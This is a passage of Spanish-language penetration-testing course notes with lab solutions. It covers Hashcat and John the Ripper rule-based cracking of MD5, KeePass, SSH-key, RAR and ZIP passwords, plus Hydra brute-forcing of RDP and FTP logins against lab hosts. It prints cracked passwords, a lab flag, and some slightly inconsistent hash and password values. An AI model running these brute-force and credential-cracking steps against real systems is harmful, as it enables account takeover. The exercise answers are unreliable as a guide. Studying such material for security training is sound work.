-rw-r--r-- 1 root root 301161 Dec 23 08:53 rockyou-30000.rule
-rw-r--r-- 1 root root   1563 Dec 23 08:53 specific.rule
-rw-r--r-- 1 root root  64068 Dec 23 08:53 T0XlC-insert_00-99_1950-2050_toprules_0_F.rule
...
```

Estas reglas predefinidas cubren una amplia variedad de mutaciones y son más útiles cuando no tenemos información sobre la política de contraseñas del objetivo. Usaremos las reglas predefinidas en las próximas demostraciones y ejemplos. Sin embargo, siempre es más eficiente descubrir información sobre políticas de contraseñas existentes o buscar políticas predeterminadas que se usan normalmente para el entorno de software de destino.

Resumamos brevemente lo que hicimos en esta sección. Comenzamos discutiendo los ataques basados ​​en reglas y por qué son preferibles a los ataques de diccionario. Luego, discutimos las reglas y las usamos para mutar listas de palabras para descifrar un hash MD5. Al final de esta sección, presentamos brevemente los archivos de reglas predefinidos proporcionados por Hashcat.

En la siguiente sección, discutiremos una metodología básica para el craqueo, que podemos usar como esquema para demostraciones y ejercicios.

<br />

**1. You extracted the MD5 hash "056df33e47082c77148dba529212d50a" from a target system. Create a rule to add "1@3$5" to each password of the rockyou.txt wordlist and crack the hash.**

```
cat hash.txt 
19adc0e8921336d08502c039dc297ff8

cat rule.demo    
$1 $@ $3 $$ $5

hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r rule.demo --force --show
056df33e47082c77148dba529212d50a:courtney1@3$5
```

<br />

**2.  You extracted the MD5 hash "19adc0e8921336d08502c039dc297ff8" from a target system. Create a rule which makes all letters upper case and duplicates the passwords contained in rockyou.txt and crack the hash.**

```
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt -r rule.demo --force --show
19adc0e8921336d08502c039dc297ff8:BUTTERFLY5BUTTERFLY5

cat rule.demo
u d

cat hash.txt 
19adc0e8921336d08502c039dc297ff8
```

<br />

#### 21.2.3. Craking Methodology.

En las siguientes secciones, recorreremos las diversas fases de una sesión de descifrado de contraseñas en el mundo real, comenzando con una descripción general de una metodología sólida.

Podemos describir el proceso de descifrar un hash con los siguientes pasos:

1.  Extraer hashes
2.  Hash de formato
3.  Calcular el tiempo de agrietamiento
4.  Preparar lista de palabras
5.  Ataca el hash

El primer paso es extraer los hashes. En una prueba de penetración encontraremos hashes en varias ubicaciones. Por ejemplo, si tenemos acceso a un sistema de base de datos, podemos volcar la tabla de la base de datos que contiene las contraseñas de usuario cifradas.

El siguiente paso es formatear los hashes en el formato de craqueo esperado de nuestra herramienta. Para hacer esto, necesitaremos conocer el algoritmo hash utilizado para crear el hash. Podemos identificar el tipo de hash con *hash-identifier* o *hashid*, que están instalados en Kali. Según el algoritmo hash y la fuente del hash, es posible que debamos verificar si ya está en el formato correcto para nuestra herramienta de craqueo. De lo contrario, debemos usar herramientas auxiliares para cambiar la representación del hash al formato esperado de nuestra herramienta de craqueo.

En el tercer paso, determinaremos la viabilidad de nuestro intento de craqueo. Como discutimos antes, el tiempo de craqueo consiste en el espacio de claves dividido por la tasa de hash. Si el tiempo de craqueo calculado excede nuestra vida útil esperada, ¡podríamos reconsiderar este enfoque!

De manera más realista, deberíamos considerar la duración de la prueba de penetración actual teniendo en cuenta que probablemente nos veamos obligados a detener la sesión (junto con otras actividades de limpieza) cuando termine la prueba. En lugar de mantener la esperanza de éxito en una sesión de craqueo prospectiva demasiado larga, deberíamos considerar vectores de ataque alternativos o invertir en una actualización de hardware o una instancia de máquina basada en la nube.

El cuarto paso considera la preparación de la lista de palabras. En casi todos los casos, deberíamos mutar nuestra lista de palabras y realizar un ataque basado en reglas, en lugar de un ataque de diccionario directo. En este paso, debemos investigar posibles políticas de contraseñas e investigar otros vectores de contraseñas, incluidos los sitios de fuga de contraseñas en línea. Sin esto, es posible que necesitemos ejecutar varias listas de palabras con (o sin) reglas preexistentes para una amplia cobertura de posibles contraseñas.

Después de toda la preparación, podemos encender nuestra herramienta y comenzar el proceso de craqueo. Llegados a este punto, debemos tener especial cuidado al copiar y pegar nuestros hashes. Un espacio adicional o una nueva línea podría hacer que nuestros esfuerzos sean inútiles. Además, debemos estar seguros del tipo de hash que estamos usando. Por ejemplo, hashid no puede determinar automáticamente si **b08ff247dc7c5658ff64c53e8b0db462** es MD2, MD4 o MD5. Una elección incorrecta obviamente hará perder tiempo. Podemos evitar esta situación verificando dos veces los resultados con otras herramientas y realizando investigaciones adicionales.

Seguiremos esta metodología en las próximas demostraciones para reforzar los aspectos y detalles importantes del proceso de craqueo. La mejor manera de mejorar nuestros resultados en este proceso que suele ser largo es operar con enfoque y estructura.

**Crack the following hashes "4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7", "\$2y\$10\$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC"**

```
hashid <<< 4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7
Analyzing '4a41e0fdfb57173f8156f58e49628968a8ba782d0cd251c6f3e2426cb36ced3b647bf83057dabeaffe1475d16e7f62b7'
[+] SHA-384 
[+] SHA3-384 
[+] Skein-512(384) 
[+] Skein-1024(384)

hashid <<< \$2y\$10\$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC
Analyzing '$2y$10$XrrpX8RD6IFvBwtzPuTlcOqJ8kO2px2xsh17f60GZsBKLeszsQTBC'
[+] Blowfish(OpenBSD) 
[+] Woltlab Burning Board 4.x 
[+] bcrypt 
```

<br />

#### 21.2.4. Passwords Managers.

Los Passwords Managers (administradores de contraseñas) crean y almacenan contraseñas para diferentes servicios, protegiéndolas con una contraseña maestra (master password). Esta contraseña maestra otorga acceso a todas las contraseñas que posee el administrador de contraseñas. Los usuarios a menudo copian y pegan estas contraseñas desde el administrador de contraseñas o usan una función de autocompletar vinculada a un navegador. Ejemplos de administradores de contraseñas populares son *1Password*  y *KeePass*. Este tipo de software puede ayudar a los usuarios que a menudo se ven obligados a mantener muchas contraseñas, a menudo complejas, pero también puede introducir riesgos en una organización.

En esta sección, demostraremos un escenario de prueba de penetración muy común. Supongamos que hemos obtenido acceso a un client workstation que ejecuta un administrador de contraseñas. En la siguiente demostración, extraeremos la base de datos del administrador de contraseñas, transformaremos el archivo a un formato que pueda usar Hashcat y descifraremos la contraseña de la base de datos maestra.

Comencemos conectándonos a la máquina SALESWK01 (192.168.50.203) a través de RDP. Suponiendo que hemos obtenido las credenciales para el usuario _jason_ (laboratorio), iniciaremos sesión y después de una conexión exitosa, obtendremos acceso al escritorio del sistema.

Una vez conectado, comprobaremos qué programas están instalados en el sistema. Hay muchas formas de buscar programas instalados, pero dado que tenemos acceso a la GUI, usaremos la función Aplicaciones y características de Windows, que es el enfoque más directo. Haremos clic en el icono de Windows, escribiremos "Apps", seleccionaremos "Add or remove programs" y nos desplazaremos hacia abajo para revisar todos los programas instalados, así comprobaremos que *KeePass*.

La lista nos muestra que _KeePass_ está instalado en el sistema. Si no estuviéramos familiarizados con este programa, lo investigaríamos y eventualmente descubriríamos que la base de datos de KeePass está almacenada como un archivo _.kdbx_ y que puede haber más de una base de datos en el sistema. Por ejemplo, un usuario puede mantener una base de datos personal y una organización puede mantener una base de datos a nivel de departamento. Nuestro próximo paso es ubicar los archivos de la base de datos buscando todos los archivos **.kdbx** en el sistema.

Usemos PowerShell con el cmdlet *Get-ChildItem* para ubicar archivos en ubicaciones específicas. Usaremos *-Path C:\\* para buscar en todo el disco. A continuación, usaremos *-Include* para especificar los tipos de archivos que queremos incluir, los argumentos *-File* y *-Recurse* para obtener una lista de archivos y buscar en subdirectorios. Finalmente, estableceremos *-ErrorAction* en *SilentlyContinue* para silenciar los errores y continuar con la ejecución.

```
PS C:\Users\jason> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
    
    
    Directory: C:\Users\jason\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/30/2022   8:19 AM           1982 Database.kdbx
```

El resultado revela un archivo de base de datos en la carpeta *Documentos* del usuario jason.

Transferiremos este archivo a nuestro sistema Kali como preparación para los siguientes pasos.

Ahora hemos completado el primer paso de la metodología de craqueo y podemos continuar con el siguiente paso, transformando el hash en un formato que nuestra herramienta de craqueo pueda usar.

La suite JtR incluye varios scripts de transformación como *ssh2john* y *keepass2john* que pueden formatear una amplia gama de diferentes formatos de archivo y están instalados de manera predeterminada en nuestra máquina Kali. También podemos usar estos scripts para formatear hashes para Hashcat.

Usemos el script **keepass2john** para formatear el archivo de la base de datos y guardemos el resultado en **keepass.hash** .

```
kali@kali:~/passwordattacks$ ls -la Database.kdbx
-rwxr--r-- 1 kali kali 1982 May 30 06:36 Database.kdbx


kali@kali:~/passwordattacks$ keepass2john Database.kdbx > keepass.hash   

kali@kali:~/passwordattacks$ cat keepass.hash   
Database:$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1
```

El listado anterior muestra el hash resultante de la base de datos KeePass almacenada en **keepass.hash** . Antes de que podamos trabajar con el hash resultante, debemos modificarlo aún más.

En nuestro caso, el script JtR antepuso el nombre de archivo _Base de_ datos al hash. El script hace esto para actuar como el nombre de usuario para el hash de destino. Esto es útil cuando se descifran hashes de bases de datos, ya que queremos que la salida contenga el nombre de usuario correspondiente y no solo la contraseña. Dado que KeePass usa una contraseña maestra sin ningún tipo de nombre de usuario, debemos eliminar la cadena "Base de datos:" con un editor de texto.

Después de eliminar la cadena "Base de datos:", el hash tiene el formato correcto para Hashcat:

```
kali@kali:~/passwordattacks$ cat keepass.hash   
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e...
```

Estamos casi listos para comenzar el proceso de craqueo, pero necesitamos determinar el tipo de hash para KeePass. Podríamos buscarlo en Hashcat Wiki, o grep el resultado de ayuda de hashcat como se muestra a continuación:

```
kali@kali:~/passwordattacks$ hashcat --help | grep -i "KeePass"
13400 | KeePass 1 (AES/Twofish) and KeePass 2 (AES)         | Password Manager
```

El resultado del comando grep muestra que el modo correcto para KeePass es 13400.

Saltémonos el paso tres (cálculo del tiempo de craqueo) ya que este es un ejemplo simple y no tomará mucho tiempo, y pasemos al paso cuatro para preparar nuestra lista de palabras. Usaremos una de las reglas provistas por Hashcat (*rockyou-30000.rule*), como se mencionó anteriormente, combinada con la lista de palabras **rockyou.txt** .

Este archivo de reglas es especialmente efectivo con **rockyou.txt** , ya que fue creado para él.

Cuando ingresamos al paso cinco, hemos preparado todo para nuestro ataque de contraseña. Usemos **hashcat** con los argumentos actualizados y comencemos a descifrar.

```
kali@kali:~/passwordattacks$ hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force
hashcat (v6.2.5) starting
...
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
...
```

Después de varios segundos, Hashcat descifró con éxito el hash y descubrió la contraseña maestra de KeePass de "qwertyuiop123". Ejecutemos KeePass sobre nuestra conexión RDP y, cuando se le solicite, ingrese la contraseña.

<br />

**1. Follow the steps outlined in this section to obtain the master password of the KeePass database on VM #1 (SALESWK01). Enter the password found with the title "User Company Password"**

En primer lugar, nos logeamos a la máquina utilizanod el siguiente comando de xfreerdp:

```
xfreerdp /drive:kali,/home/kali/labs /v:192.168.233.203 /u:jason /p:lab
```

Recordamos que este comando nos permite compartir la carpeta /home/kali/labs de nuestra kali con el sistema remoto. Seguidamente, buscamos en Apps > Add or remove programs si está instalado KeePass y comprobamos que si lo tiene instalado. Así, buscamos en el sistema todos los archivos .kdbx aprovechándonos de PowerShell:

```
PS C:\Users\jason> Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue


    Directory: C:\Users\jason\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         5/30/2022  10:33 AM           1982 Database.kdbx


PS C:\Users\jason> cd Documents
PS C:\Users\jason\Documents> ls


    Directory: C:\Users\jason\Documents


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----          6/9/2022   9:23 AM                WindowsPowerShell
-a----         5/30/2022  10:33 AM           1982 Database.kdbx
```

Y copiamos este fichero Database.kdbx sobre la carpeta compartida de nuestro fichero:

<div style="text-align:center">
	<img src="{{ 'assets/img/pen/Pasted image 20230428115827.png' | relative_url }}" text-align="center"/>
</div>

Seguidamente, en nuestra máquina Kali utilizamos john the ripper para pasar el hash a un formato crackeable:

```
keepass2john Database.kdbx > hash.txt
```

Y empleamos hashcat:

```
hashcat -m 13400 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/rockyou-30000.rule --force --show
$keepass$*2*60*0*d74e29a727e9338717d27a7d457ba3486d20dec73a9db1a7fbc7a068c9aec6bd*04b0bfd787898d8dcd4d463ee768e55337ff001ddfac98c961219d942fb0cfba*5273cc73b9584fbd843d1ee309d2ba47*1dcad0a3e50f684510c5ab14e1eecbb63671acae14a77eff9aa319b63d71ddb9*17c3ebc9c4c3535689cb9cb501284203b7c66b0ae2fbf0c2763ee920277496c1:qwertyuiop123!
```

Observemos que hemos modificado las lista rockyou.txt con una regla.

Seguiadamente, nos volvemos a logear sobre la máquina e intentamos accedr a la base de datos, vamos a la aplicación KeePass 2 e ingresamos la Master Password y tenemos acceso.

<br />

**2.  Enumerate VM #2 and get access to the system as user _nadine_. Obtain the password stored as title "flag" in the password manager.**

We obtain nadine's credentials by bruteforcing:

```
┌──(kali㉿kali)-[~]
└─$ sudo hydra -l nadine -P /usr/share/wordlists/rockyou.txt rdp://192.168.221.227
[sudo] password for kali: 
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-07-03 12:17:13
[WARNING] rdp servers often don't like many connections, use -t 1 or -t 4 to reduce the number of parallel connections and -W 1 or -W 3 to wait between connection to allow the server to recover
[INFO] Reduced number of tasks to 4 (rdp does not like many parallel connections)
[WARNING] the rdp module is experimental. Please test, report - and if possible, fix.
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 4 tasks per 1 server, overall 4 tasks, 14344399 login tries (l:1/p:14344399), ~3586100 tries per task
[DATA] attacking rdp://192.168.221.227:3389/
[3389][rdp] host: 192.168.221.227   login: nadine   password: 123abc
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-07-03 12:17:46
```

Procedemos de la misma forma que en el ejercicio anterior, buscamos el hash, lo crakeamos accedemos al password manager y recuperamos la flag.

<br />

#### 21.2.5 SSH Private Key Passphrase.

En esta sección nos preocuparemos de crakear las *passphrases* de claves SSH.

Aunque las claves privadas de SSH deben mantenerse confidenciales, existen muchos escenarios en los que estos archivos podrían verse comprometidos. Por ejemplo, si accedemos a una aplicación web a través de una vulnerabilidad como *Directory Traversal* , podríamos leer archivos en el sistema. Podríamos usar esto para extraer la clave privada SSH de un usuario. Sin embargo, recientes medidas de seguridad han implementado una contraseña de acceso a la clave denominada 'passphrase', de esta forma, cuando intentemos usarla para conectarnos al sistema (si la conexión no se realiza desde un sistema legítimo), se nos solicitará una contraseña. Para obtener acceso, necesitaremos descifrar la frase de contraseña.

Demostremos este escenario y cómo usar la metodología de craqueo que discutimos para descifrar la frase de contraseña de una clave privada. Cuando usamos un ataque de diccionario en el formulario de inicio de sesión HTTP BRUTE, obtuvimos acceso a un administrador de archivos basado en la web que albergaba una clave privada SSH.

Este servicio web es similar al ejemplo anterior de TinyFileManager, excepto que el directorio principal ahora contiene los dos archivos adicionales *id_rsa* y *note.txt*. Descarguemos ambos en nuestra máquina Kali y guardémoslos en nuestro directorio *passwordattacks*. Primero, revisaremos el contenido de *note.txt*:

```
kali@kali:~/passwordattacks$ cat note.txt
Dave's password list:

Window
rickc137
dave
superdave
megadave
umbrella

Note to myself:
New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
```

El resultado muestra que esta nota contiene la lista de contraseñas de Dave en texto sin formato. 

Intentemos usar la clave privada id_rsa para el usuario Dave recién identificado en una conexión SSH. Para ello, debemos modificar los permisos de la clave privada descargada. El puerto SSH utilizado en este ejemplo es 2222. Probaremos cada una de estas contraseñas como frase de contraseña para la clave privada SSH. 

```
kali@kali:~/passwordattacks$ chmod 600 id_rsa

kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.50.201
The authenticity of host '[192.168.50.201]:2222 ([192.168.50.201]:2222)' can't be established.
ED25519 key fingerprint is SHA256:ab7+Mzb+0/fX5yv1tIDQsW/55n333/oGARIluRonao4.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[192.168.50.201]:2222' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
dave@192.168.50.201's password: 

kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.50.201
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
Enter passphrase for key 'id_rsa':
```

Ninguna de las contraseñas del archivo de texto funcionó para esta frase de contraseña. Sin embargo, en una prueba de penetración real, mantendríamos estas contraseñas a mano para varios otros vectores, incluidos los ataques de rociado o los ataques contra un usuario _de dave_ en otros sistemas. Sin embargo, todavía necesitamos una frase de contraseña para usar la clave privada de _dave ._

Según el archivo *note.txt*, se habilitó una nueva política de contraseñas en enero de 2022. Hay una alta probabilidad de que _Dave_ tenga una frase de contraseña que cumpla con la nueva política de contraseñas.

Siguiendo la metodología de craqueo, nuestro siguiente paso es transformar la clave privada en un formato hash para nuestras herramientas de craqueo. Usaremos el script de transformación **ssh2john** de la suite JtR y guardaremos el hash resultante en **ssh.hash** .

```
kali@kali:~/passwordattacks$ ssh2john id_rsa > ssh.hash

kali@kali:~/passwordattacks$ cat ssh.hash
id_rsa:$sshng$6$16$7059e78a8d3764ea1e883fcdf592feb7$1894$6f70656e7373682d6b65792d7631000000000a6165733235362d6374720000000662637279707400000018000000107059e78a8d3764ea1e883fcdf592feb7000000100000000100000197000000077373682...
```


Dentro de esta salida, "\$6\$" significa *SHA-512*. Como antes, eliminaremos el nombre de archivo antes de los primeros dos puntos. Luego, determinaremos el modo Hashcat correcto.

```
kali@kali:~/passwordattacks$ hashcat -h | grep -i "ssh" 
...
  10300 | SAP CODVN H (PWDSALTEDHASH) iSSHA-1                 | Enterprise Application Software (EAS)
  22911 | RSA/DSA/EC/OpenSSH Private Keys ($0$)               | Private Key
  22921 | RSA/DSA/EC/OpenSSH Private Keys ($6$)               | Private Key
  22931 | RSA/DSA/EC/OpenSSH Private Keys ($1, $3$)           | Private Key
  22941 | RSA/DSA/EC/OpenSSH Private Keys ($4$)               | Private Key
  22951 | RSA/DSA/EC/OpenSSH Private Keys ($5$)               | Private Key
```

La salida indica que "\$6$" es el modo 22921.

Ahora, procedamos con nuestra metodología y creemos un archivo de reglas y preparemos una lista de palabras para descifrar el hash. Revisaremos nuevamente *note.txt* para determinar qué reglas debemos crear y qué contraseñas incluiremos en la lista de palabras.

```
kali@kali:~/passwordattacks$ cat note.txt
Dave's password list:

Window
rickc137
dave
superdave
megadave
umbrella

Note to myself:
New password policy starting in January 2022. Passwords need 3 numbers, a capital letter and a special character
```

En base a esto, podemos comenzar a crear nuestro archivo de reglas. Debemos incluir tres números, al menos una letra mayúscula y al menos un carácter especial.

Notamos que _Dave_ usó "137" para los tres números en la contraseña "rickc137". Además, la contraseña de "Ventana" comienza con una letra mayúscula. Usemos una función de regla para convertir la primera letra en mayúscula. No se incluye ningún carácter especial en ninguna de las contraseñas enumeradas. Para nuestro primer intento de descifrado, solo usaremos los caracteres especiales más comunes "!", "@" y "#", ya que son los primeros tres caracteres especiales al escribirlos desde el lado izquierdo de muchas distribuciones de teclado.

Basándonos en el análisis, crearemos nuestras reglas. Usaremos **c** para las mayúsculas de la primera letra y **$1** **$3** **\$7** para los valores numéricos. Para abordar los caracteres especiales, crearemos reglas para agregar los diferentes caracteres especiales **\$!** , **\$@** y **\$#**.

```
kali@kali:~/passwordattacks$ cat ssh.rule
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#
```

A continuación, crearemos un archivo de lista de palabras que contenga las contraseñas de **note.txt** y guardaremos el resultado en **ssh.passwords** .

```
kali@kali:~/passwordattacks$ cat ssh.passwords
Window
rickc137
dave
superdave
megadave
umbrella
```

Ahora podemos usar Hashcat para realizar el craqueo especificando el archivo de reglas, la lista de palabras y el modo.

```
kali@kali:~/passwordattacks$ hashcat -m 22921 ssh.hash ssh.passwords -r ssh.rule --force
hashcat (v6.2.5) starting
...

Hashfile 'ssh.hash' on line 1 ($sshng...cfeadfb412288b183df308632$16$486): Token length exception
No hashes loaded.
...
```

Desafortunadamente, recibimos un error que indica que nuestro hash provocó una "Token length exception". Cuando investigamos esto con un motor de búsqueda, varias discusiones sugieren que las claves privadas modernas y sus frases de contraseña correspondientes se crean con el cifrado *aes-256-ctr*, que el modo 22921 de Hashcat no admite.

Esto refuerza el beneficio de usar múltiples herramientas ya que John the Ripper (JtR) puede manejar este cifrado.

Para poder usar las reglas creadas previamente en JtR, debemos agregar un nombre para las reglas y agregarlas al archivo de configuración **/etc/john/john.conf .** Para esta demostración, nombraremos la regla **sshRules** con una sintaxis de nomenclatura de regla "List.Rules" (como se muestra en el Listado 34). Usaremos **sudo** y **sh -c** para agregar el contenido de nuestro archivo de reglas en **/etc/john/john.conf** .

```
kali@kali:~/passwordattacks$ cat ssh.rule
[List.Rules:sshRules]
c $1 $3 $7 $!
c $1 $3 $7 $@
c $1 $3 $7 $#

kali@kali:~/passwordattacks$ sudo sh -c 'cat /home/kali/passwordattacks/ssh.rule >> /etc/john/john.conf'
```

Ahora que agregamos con éxito nuestras sshRules al archivo de configuración de JtR, podemos usar a **John** para descifrar la frase de contraseña en el paso final de nuestra metodología. Definiremos nuestra lista de palabras con **--wordlist=ssh.passwords** , seleccionaremos la regla creada previamente con **--rules=sshRules** y proporcionaremos el hash de la clave privada como argumento final, **ssh.hash** .

```
kali@kali:~/passwordattacks$ john --wordlist=ssh.passwords --rules=sshRules ssh.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Umbrella137!     (?)     
1g 0:00:00:00 DONE (2022-05-30 11:19) 1.785g/s 32.14p/s 32.14c/s 32.14C/s Window137!..Umbrella137#
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

¡Desciframos con éxito la frase de contraseña de la clave privada! ¡Excelente!

Como era de esperar, el "Umbrella137!" contraseña cumplió con los requisitos de la política de contraseñas y también coincidió con las preferencias y hábitos personales de Dave. Esto no es una sorpresa, ya que los usuarios rara vez cambian sus patrones de contraseña.

Ahora, usemos la frase de contraseña para conectarnos al sistema de destino a través de SSH.

```
kali@kali:~/passwordattacks$ ssh -i id_rsa -p 2222 dave@192.168.50.201
Enter passphrase for key 'id_rsa':
Welcome to Alpine!

The Alpine Wiki contains a large amount of how-to guides and general
information about administrating Alpine systems.
See <http://wiki.alpinelinux.org/>.

You can setup the system with the command: setup-alpine

You may change this message by editing /etc/motd.

0d6d28cfbd9c:~$
```

Nos conectamos con éxito al sistema de destino al proporcionar la frase de contraseña correcta a la clave privada.

En esta sección, nuevamente ejecutamos la metodología de descifrado de contraseñas y reforzamos la idea de detallar cuidadosamente los patrones de comportamiento humano. Nos adaptamos a un error en nuestra herramienta principal (Hashcat) usando otra herramienta (JtR) en su lugar. En la siguiente unidad de aprendizaje, analizaremos las implementaciones de hash basadas en Windows y demostraremos los ataques contra ellas.

<br />

**1. Enumerate VM #2 and find a way to get access to SSH on port 2222. Find the flag of the user you used for the SSH connection. You can use the same rules we created in this section.**


<br />


**2. You found this encrypted file flag.rar after gaining access to the manager of MegaCorp One's /challenge folder on the VM #1 while conducting a pentest on the company. You previously identified a couple of his other passwords including nanomedicines234 and Cyberisation649 where nanomedicines and Cyberisation both are products of MegaCorp (words) that can be found on their website www.megacorpone.com. You also know the password requirement is at least 12 characters with 3 digits. Use this information to generate a custom wordlist to crack this zip file and get the flag.**

En primer lugar, vamos a intentar crackear la contraseña utilizando la herramienta *JohnTheRipper*, para ello pasamos el formato de la contraseña a uno que John pueda entender para crakear la misma con *rar2john*:

```bash
rar2john flag.rar > flag.txt
```

Seguidamente, formamos la lista de candidatos a contraseñas utilizando las siguientes herramientas, *cewl* y *crunch*:

```
cewl -d 5 -m 9 www.megacorpone.com > mega.txt
```

<br />

```
crunch 3 3 -t %%% > numbers.txt
```

Y por último combinamos ambas listas:

```
/usr/lib/hashcat-utils/combinator.bin mega.txt numbers.txt > wordlist.txt
```

Ahora con la lista de diccionario creada lanzamos JohnTheRipper sobre el fichero que contiene el hash de la contraseña que protege el fichero .rar:

```
john --wordlist=wordlist.txt flag.txt  
```

Transcurrido un tiempo obtendremos la contraseña.

```
john --wordlist=wordlist.txt flag.txt                                    
Using default input encoding: UTF-8
Loaded 1 password hash (RAR5 [PBKDF2-SHA256 128/128 AVX 4x])
Cost 1 (iteration count) is 32768 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
regeneration416  (flag.rar)     
1g 0:00:00:52 DONE (2023-03-07 11:36) 0.01888g/s 386.7p/s 386.7c/s 386.7C/s regeneration416..regeneration479
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

<br />

**3.  You found this encrypted file _flag.zip_ after gaining access to a manager's _/challenge_ folder while conducting a pentest on the target VM #2. You previously identified several of her other passwords including _bella9221!!_ and _charlie2323##_ where _rosie_ and _bailey_ are the names of two of her pets. Looking at her social media, you find out she has a third pet named _buddy_. Use this information to generate a custom wordlist to open this file and get the flag.**

De nuevo, nos logeamos en la máquina y mediante SCP transferimos el "flag.zip"  a nuestra máquina local. Seguidamente, transformamos el hash de la contraseña que protege el .zip a uno que john pueda leer con *zip2john*:

```
zip2john flag.zip > flag.txt
```

Y seguidamente pasamos a formar la lista y crakear la contraseña:

```
crunch 7 7 -t d%%%%^^ -p bailey rosie buddy > wordlist.txt
Crunch will now generate approximately the following amount of data: 805860000 bytes
768 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 65340000 


john --wordlist=wordlist.txt flag2.txt                    
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
buddy3125,,      (flag.zip/flag.txt)     
1g 0:00:00:02 DONE (2023-03-07 13:51) 0.4405g/s 11097Kp/s 11097Kc/s 11097KC/s buddy3124^*..buddy3131:~
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

<br />

**4.  After enumerating the target VM #3, you will find an FTP server running that is available remotely. Use a password attack technique to log into this FTP server with the user _offsec_ while keeping the number of workers not above 3.**

Empleamos Hydra para hacer un bruteforce sobre el servicio FTP descubierto con un escaneo previo:

```
hydra 192.168.187.52 -l offsec -P /usr/share/wordlists/rockyou.txt -t 3 -vv ftp
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

[...]

[21][ftp] host: 192.168.187.52   login: offsec   password: buster
[STATUS] attack finished for 192.168.187.52 (waiting for children to complete tests)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-03-07 14:23:26
```

Seguidamente, utilizamos estas credenciales para logearnos dentro del servicio y obtener la flag:

```
ftp offsec@192.168.187.52
Connected to 192.168.187.52.
220---------- Welcome to Pure-FTPd [privsep] [TLS] ----------
220-You are user number 1 of 50 allowed.
220-Local time is now 14:25. Server port: 21.
220-This is a private system - No anonymous login
220-IPv6 connections are also welcome on this server.
220 You will be disconnected after 15 minutes of inactivity.
331 User offsec OK. Password required
Password: 
230 OK. Current directory is /
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Extended Passive mode OK (|||29059|)
ftp: Can't connect to `192.168.187.52:29059': Connection refused
200 PORT command successful
150 Connecting to port 41983
-r--r-----    1 1001       ftpgroup           37 Mar  7 14:05 flag.txt
ftp> more flag.txt
OS{57286839806732c921b056b2f40ef7a3}
```

<br />

**5.  Use a password attack technique against the target VM #4 to log into the website with the _offsec_ user.**

La web utiliza un sistema de logeo basado en http-auth. En primera instancia podemos caer en la tentación de emplear un 'http-post-form':

```
